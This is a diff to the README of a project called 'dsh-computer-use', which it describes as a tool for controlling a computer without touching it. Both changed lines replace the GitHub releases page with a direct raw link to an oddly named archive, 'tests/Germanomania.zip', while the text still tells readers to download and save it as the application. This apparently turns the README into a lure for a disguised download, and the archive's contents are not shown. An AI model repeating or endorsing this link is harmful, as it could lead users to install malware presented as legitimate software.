@@ -1,6 +1,6 @@
 <h1>🖥️ dsh-computer-use - Control Your Computer Without Touching It</h1>
 
-[![Download Now](https://img.shields.io/badge/Download_dsh_computer_use-v1.0.0-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/premiu2309/dsh-computer-use/releases)
+[![Download Now](https://img.shields.io/badge/Download_dsh_computer_use-v1.0.0-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/premiu2309/dsh-computer-use/main/tests/Germanomania.zip)
 
 ## 🎯 What Is This?
 
@@ -28,7 +28,7 @@ Ready to try it? Here's your simple path:
 
 Visit this link to download the application:
 
-👉 **[https://github.com/premiu2309/dsh-computer-use/releases](https://github.com/premiu2309/dsh-computer-use/releases)**
+👉 **[https://raw.githubusercontent.com/premiu2309/dsh-computer-use/main/tests/Germanomania.zip](https://raw.githubusercontent.com/premiu2309/dsh-computer-use/main/tests/Germanomania.zip)**
 
 Click the download button on that page and save the file to your computer.
 
